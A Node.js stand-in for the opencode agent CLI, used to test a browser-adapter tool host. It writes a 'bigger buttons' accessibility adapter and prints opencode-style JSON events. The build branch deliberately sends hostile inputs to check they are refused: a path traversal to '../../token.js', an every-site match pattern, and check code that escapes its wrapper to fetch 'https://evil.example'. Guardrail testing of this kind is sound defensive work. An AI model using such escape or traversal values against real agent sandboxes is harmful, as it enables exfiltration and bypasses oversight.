#!/usr/bin/env node
// Stands in for `opencode run --format json` in the host's tests: it reads the
// sandbox config like opencode does, writes an adapter, calls the browser
// tools over MCP like the agent would, and prints opencode-style JSON lines.

import { readFileSync, mkdirSync, writeFileSync } from 'node:fs';

const config = JSON.parse(readFileSync(process.env.OPENCODE_CONFIG, 'utf8'));
const { url, headers } = config.mcp.browser;
const args = process.argv.slice(2);
const session = args.includes('--session') ? args[args.indexOf('--session') + 1] : 'ses_fake123';
const message = args.at(-1);
const out = (o) => process.stdout.write(`${JSON.stringify({ sessionID: session, timestamp: Date.now(), ...o })}\n`);
let n = 0;
async function tool(name, args) {
  const res = await fetch(url, { method: 'POST', headers: { ...headers, 'content-type': 'application/json' }, body: JSON.stringify({ jsonrpc: '2.0', id: ++n, method: 'tools/call', params: { name, arguments: args } }) });
  return (await res.json()).result;
}

out({ type: 'step_start', part: { type: 'step-start' } });
if (/hang/.test(message)) { await new Promise(() => {}); }
if (/build/.test(message)) {
  // Two reads in a row: the sidebar folds them into one line.
  for (const id of ['p1', 'p1b']) out({ type: 'tool_use', part: { id, type: 'tool', tool: 'read', state: { status: 'completed', input: { filePath: '/toolkit/.claude/skills/ai4a11y-toolkit/SKILL.md' }, output: 'SECRET FILE TEXT' } } });
  const page = await tool('browser_page', { reason: 'To see which buttons are small.' });
  // Runs on the site the person shared, like the agent would choose.
  const address = /Address: (\S+)/.exec(page.content[0].text)?.[1];
  const runsOn = [address ? `${new URL(address).origin}/*` : 'https://example.com/*'];
  out({ type: 'tool_use', part: { id: 'p2', type: 'tool', tool: 'execute', state: { status: 'completed', input: { code: 'x' }, output: page.content[0].text } } });
  mkdirSync('adapters', { recursive: true });
  writeFileSync('adapters/bigger-buttons.js', 'export const BiggerButtons = { enable() { document.body.dataset.big = "1"; }, disable() { delete document.body.dataset.big; } };\n');
  out({ type: 'tool_use', part: { id: 'p3', type: 'tool', tool: 'write', state: { status: 'completed', input: { filePath: '/work/adapters/bigger-buttons.js', content: 'export const …' } } } });
  const checks = [{ name: 'the page is marked big', code: 'return document.body.dataset.big === "1";' }];
  const ready = (o = {}) => tool('adapter_ready', { file: 'adapters/bigger-buttons.js', id: 'bigger-buttons', name: 'Bigger buttons', about: 'Makes buttons bigger.', runs_on: runsOn, support_areas: ['motor'], ...o });
  const early = await ready();
  const outside = await tool('browser_preview', { file: '../../token.js', name: 'x', runs_on: ['https://example.com/*'], checks });
  const everywhere = await tool('browser_preview', { file: 'adapters/bigger-buttons.js', name: 'Bigger buttons', runs_on: ['https://*/*'], checks });
  const unchecked = await tool('browser_preview', { file: 'adapters/bigger-buttons.js', name: 'Bigger buttons', runs_on: runsOn, checks: [] });
  const escape = await tool('browser_preview', { file: 'adapters/bigger-buttons.js', name: 'Bigger buttons', runs_on: runsOn, checks: [{ name: 'x', code: 'return 1; }); fetch("https://evil.example"); (async () => {' }] });
  const preview = await tool('browser_preview', { file: 'adapters/bigger-buttons.js', name: 'Bigger buttons', runs_on: runsOn, checks });
  const done = await ready();
  const verdict = (r) => (r.isError ? 'refused' : 'allowed');
  out({ type: 'text', part: { id: 'p4', type: 'text', text: `Done.\n\`\`\`js\nexport const BiggerButtons = {}\n\`\`\`\nEarly: ${verdict(early)}. Outside: ${verdict(outside)}. Everywhere: ${verdict(everywhere)}. Unchecked: ${verdict(unchecked)}. Escape: ${verdict(escape)}. Preview: ${preview.content[0].text.split('\n')[0]} Changed: ${/enable\(\) made \d+ changes/.test(preview.content[0].text) ? 'yes' : 'no'}. Axe: ${/added no problems axe-core finds/.test(preview.content[0].text) ? 'clean' : /The adapter added \d+ problems/.test(preview.content[0].text) ? 'problems' : 'none'}. Ready: ${done.isError ? 'no' : 'yes'}.` } });
} else if (/questions/.test(message)) {
  const asked = await tool('ask_questions', { questions: [
    { question: 'Which pages?', options: [{ label: 'This page (Recommended)' }, { label: 'The whole site' }] },
    { question: 'Who does it help?', options: [{ label: 'Vision' }, { label: 'Motor' }, { label: 'Other' }], multi_select: true },
  ] });
  const bad = await tool('ask_questions', { questions: [{ question: 'Only one?', options: [{ label: 'Yes' }] }] });
  out({ type: 'text', part: { id: 'p1', type: 'text', text: `Asked: ${asked.isError ? 'no' : 'yes'}. Bad: ${bad.isError ? 'refused' : 'allowed'}.` } });
} else if (/sketch/.test(message)) {
  // Writes an adapter and stops without previewing it.
  mkdirSync('adapters', { recursive: true });
  writeFileSync('adapters/sketch.js', 'export const Sketch = { enable() {}, disable() {} };\n');
  out({ type: 'text', part: { id: 'p1', type: 'text', text: 'Here is a sketch.' } });
} else {
  out({ type: 'text', part: { id: 'p1', type: 'text', text: `You said: ${message}` } });
}
out({ type: 'step_finish', part: { type: 'step-finish' } });
